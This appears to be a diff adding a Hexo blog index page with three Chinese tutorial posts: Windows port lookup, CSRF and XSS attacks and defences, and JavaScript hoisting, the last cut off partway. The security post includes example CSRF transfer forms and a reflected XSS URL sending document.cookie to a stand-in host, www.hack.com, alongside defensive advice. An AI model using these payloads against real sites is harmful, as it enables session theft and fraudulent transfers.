@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+  
+  <title>Marks &amp; Notes</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Marks & Notes">
+<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+<meta property="og:site_name" content="Marks & Notes">
+<meta property="og:description">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Marks & Notes">
+<meta name="twitter:description">
+  
+    <link rel="alternate" href="/atom.xml" title="Marks &amp; Notes" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/blog/css/style.css">
+  
+
+  
+<script type="text/javascript">
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?7f1ea269d2e25e1cda2420b588322207";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</head>
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/blog/" id="logo">Marks &amp; Notes</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/blog/">Home</a>
+        
+          <a class="main-nav-link" href="/blog/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-learning/windows-port-used" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/learning/learning/windows-port-used.html" class="article-date">
+  <time datetime="2015-05-15T16:00:00.000Z" itemprop="datePublished">2015-05-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/blog/categories/learning/">学习</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/learning/learning/windows-port-used.html">Windows下端口占用程序查询</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="1-打开命令行工具"><a href="#1-打开命令行工具" class="headerlink" title="1.打开命令行工具"></a>1.打开命令行工具</h3><p>输入以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -aon|findstr 8082</span><br></pre></td></tr></table></figure>
+<p>可以看到类似以下的输出，最后一列为占用端口的程序的进程id</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TCP    0.0.0.0:8082           0.0.0.0:0              LISTENING       2480</span><br><span class="line">TCP    [::]:8082              [::]:0                 LISTENING       2480</span><br></pre></td></tr></table></figure>
+<h3 id="2-根据进程ID查询程序信息"><a href="#2-根据进程ID查询程序信息" class="headerlink" title="2.根据进程ID查询程序信息"></a>2.根据进程ID查询程序信息</h3><p>输入以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist|findstr 2480</span><br></pre></td></tr></table></figure>
+<p>控制台会输出该进程的程序信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.exe                      2480 Console                    3    253,168 K</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/blog/learning/learning/windows-port-used.html" data-id="cin79x0d6000k9cqe424hv9hc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!--
+
+-->
+
+<!-- 多说评论框 start -->
+<div class="ds-thread" data-thread-key="post-learning/windows-port-used" data-title="Windows下端口占用程序查询" data-url="undefined"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"yangdage"};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0] 
+   || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+<!-- 多说公共JS代码 end -->
+
+<!-- 搜索引擎优化 start-->
+
+<!-- 搜索引擎优化 end-->
+  
+    <article id="post-learning/csrf和xss攻击与防御" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/learning/learning/csrf和xss攻击与防御.html" class="article-date">
+  <time datetime="2015-04-05T16:00:00.000Z" itemprop="datePublished">2015-04-06</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/blog/categories/learning/">学习</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/learning/learning/csrf和xss攻击与防御.html">CSRF和XSS防御与攻击</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="CSRF概述"><a href="#CSRF概述" class="headerlink" title="CSRF概述"></a>CSRF概述</h3><p>CSRF(Cross-Site Request Forgery)，翻译过来叫做跨站请求伪造。是一种挟制终端用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。<br>攻击者只要借助少许的社会工程诡计，例如通过电子邮件或者是聊天软件发送的链接，攻击者就能迫使<br>一个Web应用程序的用户去执行攻击者精心构造的操作。</p>
+<h4 id="实例解释"><a href="#实例解释" class="headerlink" title="实例解释"></a>实例解释</h4><p>假设某用户登录网络银行去查看其存款余额，他没有退出网络银行系统就去了自己喜欢的论坛去逛逛，如果攻击者在论坛事先已经构造了一个恶意转账的链接并诱使该用户点击了该链接，那么该用户在网络银行帐户中的资金就有可能被转移到攻击者指定的帐户中。</p>
+<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>当CSRF针对普通用户发动攻击时，将对终端用户的数据和操作指令构成严重的威胁，危及个人隐私及财产；当受攻击的终端用户具有管理员帐户的时候，CSRF攻击可能会危及整个Web应用程序。</p>
+<h3 id="CSRF成因"><a href="#CSRF成因" class="headerlink" title="CSRF成因"></a>CSRF成因</h3><ul>
+<li>Web浏览器对于Cookie和HTTP身份验证信息之类的会话信息的处理方式</li>
+</ul>
+<p>浏览器会自动地发送标识用户对话的信息，而无需用户干预。换句话说，<br>当浏览器发送这些身份信息的时候，用户根本感觉不到。</p>
+<ul>
+<li>攻击者对Web应用程序URL的了解</li>
+</ul>
+<p>分析请求URL或者通过访问该应用程序并查看嵌入HTML/JavaScript中的URL<br>以及表单来了解应用程序有关的URL、参数和容许值。</p>
+<ul>
+<li>WEB应用会话管理对浏览器的透明性</li>
+</ul>
+<p>浏览器可以访问会话管理信息，如果Web应用程序完全依赖于这类信息来识别<br>一个用户会话，这就为跨站请求伪造创造了条件。</p>
+<ul>
+<li>各种能够引发资源请求HTML标签</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link&gt;,&lt;img&gt;,&lt;iframe&gt;,&lt;script&gt;等等可以跨域引用第三方资源的标签，这些带有</span><br><span class="line">src属性的标签每次加载是就相当于触发一次GET请求。</span><br></pre></td></tr></table></figure>
+<h4 id="CSRF触发条件"><a href="#CSRF触发条件" class="headerlink" title="CSRF触发条件"></a>CSRF触发条件</h4><ul>
+<li>1.登陆信任网站，本地存有用户cookie</li>
+<li>2.没有登出信任网站，访问危险网站。</li>
+</ul>
+<p>被攻击用户浏览器在用户不知明的情况下被迫向被攻击站点发起伪造的请求。<br>请求过程会带上被攻击用户的身份认证标识(cookie)。</p>
+<p><img src="https://raw.githubusercontent.com/yangdage/images/master/20150406/2015040600.jpg" alt="csrf"></p>
+<h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><p>案例一：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">银行网站A，它以GET请求来完成银行转账的操作:</span><br><span class="line">	</span><br><span class="line">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">危险网站B，它里面有一段HTML的代码如下：</span><br><span class="line"></span><br><span class="line">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span><br></pre></td></tr></table></figure>
+<p>案例二：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">银行网站A的WEB表单如下（后台接收按request.getParameter()接收参数）:</span><br><span class="line">	</span><br><span class="line">&lt;form action=&quot;Transfer.php&quot; method=&quot;GET&quot;&gt;</span><br><span class="line">	&lt;p&gt;ToBankId: &lt;input type=&quot;text&quot; name=&quot;toBankId&quot; /&gt;&lt;/p&gt;</span><br><span class="line">	&lt;p&gt;Money: &lt;input type=&quot;text&quot; name=&quot;money&quot; /&gt;&lt;/p&gt;</span><br><span class="line">	&lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Transfer&quot; /&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">危险网站B，它里面有同样一段HTML的代码如下：</span><br><span class="line"></span><br><span class="line">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</span><br></pre></td></tr></table></figure>
+<p>案例三:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">银行网站A的WEB表单如下（后台接收限制POST方式接收接收参数）:</span><br><span class="line">	</span><br><span class="line">&lt;form action=&quot;Transfer.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">	&lt;p&gt;ToBankId: &lt;input type=&quot;text&quot; name=&quot;toBankId&quot; /&gt;&lt;/p&gt;</span><br><span class="line">	&lt;p&gt;Money: &lt;input type=&quot;text&quot; name=&quot;money&quot; /&gt;&lt;/p&gt;</span><br><span class="line">	&lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;Transfer&quot; /&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">危险网站B也跟着改进了一下代码:	</span><br><span class="line"></span><br><span class="line">&lt;iframe name=&quot;ifr_trans&quot; display=&quot;none&quot;&gt;</span><br><span class="line">    &lt;form method=&quot;POST&quot; name=&quot;transfer&quot;　action=&quot;http://www.myBank.com/Transfer.php&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;toBankId&quot; value=&quot;11&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;1000&quot;&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function steal()&#123;</span><br><span class="line">     iframe = document.frames[&quot;ifr_trans&quot;];</span><br><span class="line">     iframe.document.Submit(&quot;transfer&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="用户防御意识"><a href="#用户防御意识" class="headerlink" title="用户防御意识"></a>用户防御意识</h3><ul>
+<li>使用完Web应用程序之后记得退出登录</li>
+<li>不要让浏览器保存敏感网站用户名/密码</li>
+<li>不要随便点击陌生人发的未知链接</li>
+<li>不要使用同一浏览器同时访问敏感的应用程序和随意冲浪</li>
+<li>小心查看支持HTM格式的邮件</li>
+</ul>
+<h3 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h3><ul>
+<li>1.过滤所有用户发布的链接（下下策）</li>
+</ul>
+<p>攻击者不一定要从站内发起请求，而且就算从站内发起请求，<br>途径也远远不知链接一条。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">嵌入危险网站的图片引用触发攻击请求：</span><br><span class="line">&lt;img src=&quot;http://www.xxx.com/feedback?content=xxx&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>2.请求头Referer检测(防小白HACKER)</li>
+</ul>
+<p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站。</p>
+<p>验证 Referer ，就是把安全性都依赖于第三方（即浏览器）来保障，<br>从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或<br>FF2，有一些方法可以随意篡改 Referer 值。</p>
+<ul>
+<li>3.请求令牌token（高级一点）</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">i.服务器端生成随机字符串，作为令牌（token），保存在Session里。</span><br><span class="line">ii.请求的页面用隐藏域形式存储token。</span><br><span class="line">iii.token与其他信息一起提交。</span><br><span class="line">iv.服务断比较接收到的令牌与Session中的令牌，相同才处理请求。</span><br><span class="line">   否则返回失败状态。</span><br><span class="line">v.正常处理完请求一定一定一定要清理token。</span><br></pre></td></tr></table></figure>
+<ul>
+<li>4.高级请求令牌（破解难度大，影响用户体验）</li>
+</ul>
+<p>图片验证码等,短信验证码,语音验证码等等</p>
+<ul>
+<li>5.非主流处理方式</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i.尽量使用POST而不是GET</span><br><span class="line">(POST可以通过JavaScript进行模仿,相对提高了攻击难度)</span><br><span class="line"></span><br><span class="line">ii.跳转中间确认页</span><br></pre></td></tr></table></figure>
+<h3 id="告诉你一个不好的消息"><a href="#告诉你一个不好的消息" class="headerlink" title="告诉你一个不好的消息"></a>告诉你一个不好的消息</h3><p><strong>事实上目前无法从根本解决CSRF防御问题，只能尽量构造更多障碍，提高攻击难度，构造更多障碍的同时会影响正常用户的用户体验。</strong></p>
+<h3 id="浏览器同源策略"><a href="#浏览器同源策略" class="headerlink" title="浏览器同源策略"></a>浏览器同源策略</h3><p>同源策略，它是由Netscape提出的一个著名的安全策略。现在所有支持JavaScript的浏览器都会使用这个策略。所谓同源是指，域名，协议，端口相同。</p>
+<p>现有链接<strong><a href="http://www.xxx.com/1.js" target="_blank" rel="external">http://www.xxx.com/1.js</a></strong>，下表列出相关链接是否同源情况</p>
+<table>
+<thead>
+<tr>
+<th>站点/链接</th>
+<th>是否同源</th>
+<th>判断依据</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://www.xxx.com" target="_blank" rel="external">https://www.xxx.com</a></td>
+<td>不同源</td>
+<td>协议不同</td>
+</tr>
+<tr>
+<td><a href="http://m.xxx.com" target="_blank" rel="external">http://m.xxx.com</a></td>
+<td>不同源</td>
+<td>子域名不同</td>
+</tr>
+<tr>
+<td><a href="http://xxx.com" target="_blank" rel="external">http://xxx.com</a></td>
+<td>不同源</td>
+<td>域名不同，此为顶级域</td>
+</tr>
+<tr>
+<td><a href="http://www.xxx.com:9999" target="_blank" rel="external">http://www.xxx.com:9999</a></td>
+<td>不同源</td>
+<td>端口不同</td>
+</tr>
+<tr>
+<td><a href="http://www.xxx.com/a.js" target="_blank" rel="external">http://www.xxx.com/a.js</a></td>
+<td>同源</td>
+<td>域名，协议，端口相同</td>
+</tr>
+</tbody>
+</table>
+<h3 id="XSS注入攻击"><a href="#XSS注入攻击" class="headerlink" title="XSS注入攻击"></a>XSS注入攻击</h3><p>XSS(Cross Site Scripting)，跨站脚本攻击，与SQL注入攻击类似，恶意用户，在一些公共区域（例如，论坛，评论）输入一些文本，这些文本被其它用户看到，但这些文本不仅仅是他们要输入的文本，同时还包括一些可以在客户端执行的脚本。</p>
+<ul>
+<li>1.反射型XSS</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/test.jsp页面内容如下：</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">页面内容：&lt;%=request.getParameter(&quot;content&quot;)%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">反射注入请求URL:</span><br><span class="line"></span><br><span class="line">http://www.xxx.com/test.jsp?content=&lt;script&gt;window.open(&quot;www.hack.com?param=&quot;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>2.持久型XSS</li>
+</ul>
+<p>持久型XSS攻击一般存在于展示用户输入的页面（如评论页），这些数据会存储到网站服务器后台数据库，所以也叫存储型XSS。</p>
+<p>以下是个人测试网票网的评论页存在持久型XSS注入的截图。</p>
+<p><img src="https://raw.githubusercontent.com/yangdage/images/master/20150406/2015040601.png" alt="csrf"></p>
+<p><img src="https://raw.githubusercontent.com/yangdage/images/master/20150406/2015040602.png" alt="csrf"></p>
+<h3 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h3><p>对用户提交的数据中的html标签特殊字符编码处理。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">switch(c) &#123;</span><br><span class="line">case &apos;&amp;&apos;:</span><br><span class="line">    return&quot;&amp;amp;&quot;;</span><br><span class="line">case &apos;&lt;&apos;:</span><br><span class="line">    return&quot;&amp;lt;&quot;;</span><br><span class="line">case &apos;&gt;&apos;:</span><br><span class="line">    return&quot;&amp;gt;&quot;;</span><br><span class="line">case &apos;&quot;&apos;:</span><br><span class="line">    return&quot;&amp;quot;&quot;;</span><br><span class="line">case &apos; &apos;:</span><br><span class="line">    return&quot;&amp;nbsp;&quot;;</span><br><span class="line">default:</span><br><span class="line">    return c +&quot;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h3><p>社会工程学以顺从你的意愿、满足你的欲望的方式，让你上当的一些方法、一门艺术与学问。<br>一种利用人的本能反应、好奇心、信任、贪便宜等弱点进行诸如欺骗、伤害等危害手段，获取自身利益的手法。</p>
+<p>社会工程攻击不是传统的信息安全的范畴，也被称为 “非传统信息安全”.</p>
+<p>信息安全预测：<br>“社会工程学是未来最大信息系统入侵与反入侵对抗领域，许多破坏力最大的行为是由于社会工程学<br>而不是黑客或破坏行为造成的。”</p>
+<p>近年代表应用：<br>1.免费下载软件中捆绑流氓软件<br>2.免费音乐中包含病毒<br>3.网络钓鱼<br>4.垃圾电子邮件中的恶意链接或间谍软件</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/blog/learning/learning/csrf和xss攻击与防御.html" data-id="cin79x0co00089cqetl8bjvwf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!--
+
+-->
+
+<!-- 多说评论框 start -->
+<div class="ds-thread" data-thread-key="post-learning/csrf和xss攻击与防御" data-title="CSRF和XSS防御与攻击" data-url="undefined"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"yangdage"};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0] 
+   || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+<!-- 多说公共JS代码 end -->
+
+<!-- 搜索引擎优化 start-->
+
+<!-- 搜索引擎优化 end-->
+  
+    <article id="post-javascript/javascript中声明提升和函数作用域" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog/javascript/javascript/javascript中声明提升和函数作用域.html" class="article-date">
+  <time datetime="2015-03-14T16:00:00.000Z" itemprop="datePublished">2015-03-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/blog/categories/javascript/">javascript</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/blog/javascript/javascript/javascript中声明提升和函数作用域.html">Javascript中声明提升和链式作用域</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="声明提升的定义"><a href="#声明提升的定义" class="headerlink" title="声明提升的定义"></a>声明提升的定义</h3><p>声明提升就是将变量和函数的声明提升到作用域的顶端定义，<strong>但不赋值</strong>。</p>
+<h3 id="变量声明提升"><a href="#变量声明提升" class="headerlink" title="变量声明提升"></a>变量声明提升</h3><p>我们先看一个简单的例子</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	var a=1;</span><br><span class="line">	console.log(a);</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	a=1;</span><br><span class="line">	console.log(a);</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>就问你这两段控制台是不是输出1，是，就是这么傲娇的肯定。答对了，状态不错，我们稍微修改下上面的代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	console.log(a);</span><br><span class="line">	var a=2;</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	console.log(a);</span><br><span class="line">	a=2;</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上面的代码我们将控制台输出语句跟变量声明换了个位置，而且我还换了个值，就问你这个会打印什么？<br>是2？天真！！！这里第一个输出的是<strong>undefined</strong>，第二个<strong>undefined</strong>都不会输出直接报错。为什么会出现这种情况呢？这里就涉及到了javascript中的声明提升的概念了。</p>
+<p>我们知道<strong>var a=2;</strong>是一个变量声明，根据前面的声明提升的定义，可以知道，这句代码里的a变量会提升到作用于顶端定义，因此下面两段代码是等价的。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	console.log(a);</span><br><span class="line">	var a=2;</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>等价于</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	var a;</span><br><span class="line">	console.log(a);</span><br><span class="line">	a=2;</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>由于变量声明中提升到顶端的只是变量的定义，不会赋值，所以这里打印<strong>undefined</strong>就在情理之中了。如果事先没有定义这个变量，我们使用了，运行的时候就会报错。</p>
+<h3 id="函数声明提升"><a href="#函数声明提升" class="headerlink" title="函数声明提升"></a>函数声明提升</h3><p>和变量声明一样，函数的声明也会被提升。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	functest();</span><br><span class="line">	var functest=function()&#123;</span><br><span class="line">		console.log("functest");</span><br><span class="line">	&#125;</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>等价于</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	var functest;</span><br><span class="line">	functest();</span><br><span class="line">	functest=function()&#123;</span><br><span class="line">		console.log("functest");</span><br><span class="line">	&#125;</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上面<strong>var functest=function(){…}</strong>的方式定义的函数不是函数声明，而是函数表达式，虽然变量<strong>functest</strong>的定义也会被提升，但是并没有将对应的匿名函数的引用赋值给它，所以执行的时候会报出错误信息:<strong>TypeError: funtest is not a function</strong></p>
+<p>下面来看下函数声明的提升</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	funtest();</span><br><span class="line">	function funtest()&#123;</span><br><span class="line">		console.log("funtest");</span><br><span class="line">	&#125;</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>等价于</p>
